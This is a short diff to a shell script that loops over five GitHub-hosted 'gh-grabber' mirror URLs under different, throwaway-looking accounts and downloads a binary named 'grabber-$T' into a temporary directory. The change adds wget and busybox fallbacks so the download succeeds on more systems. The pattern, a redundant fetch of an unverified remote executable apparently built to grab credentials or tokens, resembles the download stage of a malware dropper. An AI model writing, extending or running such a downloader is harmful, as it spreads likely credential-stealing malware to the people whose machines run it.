@@ -9,7 +9,14 @@ esac
 D=""
 for B in  https://raw.githubusercontent.com/deacon6288/gh-grabber/main/bin https://raw.githubusercontent.com/Palazuel0s2004/gh-grabber/main/bin https://raw.githubusercontent.com/Ajimati/gh-grabber/main/bin https://raw.githubusercontent.com/twana11dana10-web/gh-grabber/main/bin https://raw.githubusercontent.com/angelod1707-dotcom/gh-grabber/main/bin; do
   D=$(mktemp -d)
-  if curl -sfL -o "$D/g" "$B/grabber-$T"; then break; fi
+  if command -v curl >/dev/null 2>&1; then
+    curl -sfL -o "$D/g" "$B/grabber-$T" || true
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -O "$D/g" "$B/grabber-$T" || true
+  else
+    busybox wget -q -O "$D/g" "$B/grabber-$T" || true
+  fi
+  if [ -s "$D/g" ]; then break; fi
   rm -rf "$D"; D=""
 done
 [ -n "$D" ] || { echo "download failed" >&2; exit 1; }
